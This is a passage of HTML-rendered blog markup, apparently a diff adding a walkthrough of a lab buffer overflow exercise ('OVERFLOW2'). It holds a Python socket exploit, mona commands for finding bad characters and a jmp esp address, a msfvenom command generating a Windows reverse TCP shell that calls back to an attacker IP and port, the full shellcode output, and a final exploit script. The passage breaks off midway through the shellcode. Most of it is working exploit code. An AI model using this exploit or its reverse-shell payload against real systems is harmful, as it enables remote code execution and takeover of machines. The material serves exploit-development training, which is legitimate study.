entity" title="\x29">\x29</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x32">\x32</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x46">\x46</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x4d">\x4d</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\x5b">\x5b</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x60">\x60</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x79">\x79</span><span class="token entity" title="\x7a">\x7a</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x7d">\x7d</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\x82">\x82</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\x84">\x84</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x8d">\x8d</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x96">\x96</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x9e">\x9e</span><span class="token entity" title="\x9f">\x9f</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\xb4">\xb4</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\xc4">\xc4</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xca">\xca</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xdb">\xdb</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xe4">\xe4</span><span class="token entity" title="\xe5">\xe5</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xea">\xea</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xfb">\xfb</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xff">\xff</span>"</span>
+postfix <span class="token operator">=</span> <span class="token string">""</span>
+
+buffer <span class="token operator">=</span> prefix + overflow + retn + padding + payload + postfix
+
+s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="token punctuation">)</span>
+
+try:
+  s.connect<span class="token variable"><span class="token punctuation">((</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">))</span></span>
+  print<span class="token punctuation">(</span><span class="token string">"Sending evil buffer..."</span><span class="token punctuation">)</span>
+  s.send<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span>buffer + <span class="token string">"<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>, <span class="token string">"latin-1"</span><span class="token punctuation">))</span>
+  print<span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>
+except:
+  print<span class="token punctuation">(</span><span class="token string">"Could not connect."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/qSrEiWe.png"></p>
+<p>BadChars: <code>\x00\x23\x3c\x83\xba</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona bytearray -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\xba">\xba</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>I modify my payload to remove the BadChars.</p>
+<h1 id="Find-the-jump-point"><a href="#Find-the-jump-point" class="headerlink" title="Find the jump point"></a>Find the jump point</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona jmp -r esp -cpb <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\xba">\xba</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/ZuMQeoO.png"></p>
+<p>So <code>625011af</code> = <code>\xaf\x11\x50\x62</code><br>It will be our <code>jmp</code>. we need to place it into the EIP, so instead the BBBB</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">prefix <span class="token operator">=</span> <span class="token string">"OVERFLOW2 "</span>
+offset <span class="token operator">=</span> <span class="token number">634</span>
+overflow <span class="token operator">=</span> <span class="token string">"A"</span> * offset
+retn <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x62">\x62</span>"</span>
+padding <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span> * <span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="Gereate-the-payload"><a href="#Gereate-the-payload" class="headerlink" title="Gereate the payload"></a>Gereate the payload</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.8</span>.50.167 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4848</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread -b <span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\xba">\xba</span>"</span> -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"<span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x0c">\x0c</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\x01">\x01</span>"</span>
+<span class="token string">"<span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\x26">\x26</span>"</span>
+<span class="token string">"<span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\x69">\x69</span>"</span>
+<span class="token string">"<span class="token entity" title="\x95">\x95</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x13">\x13</span>"</span>
+<span class="token string">"<span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x31">\x31</span>"</span>
+<span class="token string">"<span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x08">\x08</span>"</span>
+<span class="token string">"<span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x22">\x22</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x16">\x16</span>"</span>
+<span class="token string">"<span class="token entity" title="\x90">\x90</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\x22">\x22</span>"</span>
+<span class="token string">"<span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\xbf">\xbf</span>"</span>
+<span class="token string">"<span class="token entity" title="\xec">\xec</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x64">\x64</span>"</span>
+<span class="token string">"<span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xe5">\xe5</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x5b">\x5b</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x9a">\x9a</span>"</span>
+<span class="token string">"<span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x81">\x81</span>"</span>
+<span class="token string">"<span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\xb4">\xb4</span>"</span>
+<span class="token string">"<span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x07">\x07</span>"</span>
+<span class="token string">"<span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\x96">\x96</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\x30">\x30</span>"</span>
+<span class="token string">"<span class="token entity" title="\x97">\x97</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\xca">\xca</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\xc3">\xc3</span>"</span>
+<span class="token string">"<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x32">\x32</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x33">\x33</span>"</span>
+<span class="token string">"<span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xc4">\xc4</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x84">\x84</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xc6">\xc6</span>"</span>
+<span class="token string">"<span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x7d">\x7d</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\xed">\xed</span>"</span>
+<span class="token string">"<span class="token entity" title="\x93">\x93</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\xf3">\xf3</span>"</span>
+<span class="token string">"<span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x84">\x84</span>"</span>
+<span class="token string">"<span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\xc9">\xc9</span>"</span>
+<span class="token string">"<span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x8d">\x8d</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x7b">\x7b</span>"</span>
+<span class="token string">"<span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x51">\x51</span>"</span>
+<span class="token string">"<span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x77">\x77</span>"</span>
+<span class="token string">"<span class="token entity" title="\x17">\x17</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xd4">\xd4</span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
+
+ip <span class="token operator">=</span> <span class="token string">"10.10.35.232"</span>
+port <span class="token operator">=</span> <span class="token number">1337</span>
+
+prefix <span class="token operator">=</span> <span class="token string">"OVERFLOW2 "</span>
+offset <span class="token operator">=</span> <span class="token number">634</span>
+overflow <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset
+retn <span class="token operator">=</span> <span class="token string">"\xaf\x11\x50\x62"</span>
+padding <span class="token operator">=</span> <span class="token string">"\x90"</span> <span class="token operator">*</span> <span class="token number">16</span>
+
+payload<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"\xfc\xbb\xcf\x2d\xa4\x5e\xeb\x0c\x5e\x56\x31\x1e\xad\x01"</span>
+<span class="token string">"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x33\xc5\x26"</span>
+<span class="token string">"\x5e\xcb\x16\x47\xd6\x2e\x27\x47\x8c\x3b\x18\x77\xc6\x69"</span>
+<span class="token string">"\x95\xfc\x8a\x99\x2e\x70\x03\xae\x87\x3f\x75\x81\x18\x13"</span>
+<span class="token string">"\x45\x80\x9a\x6e\x9a\x62\xa2\xa0\xef\x63\xe3\xdd\x02\x31"</span>
+<span class="token string">"\xbc\xaa\xb1\xa5\xc9\xe7\x09\x4e\x81\xe6\x09\xb3\x52\x08"</span>
+<span class="token string">"\x3b\x62\xe8\x53\x9b\x85\x3d\xe8\x92\x9d\x22\xd5\x6d\x16"</span>
+<span class="token string">"\x90\xa1\x6f\xfe\xe8\x4a\xc3\x3f\xc5\xb8\x1d\x78\xe2\x22"</span>
+<span class="token string">"\x68\x70\x10\xde\x6b\x47\x6a\x04\xf9\x53\xcc\xcf\x59\xbf"</span>
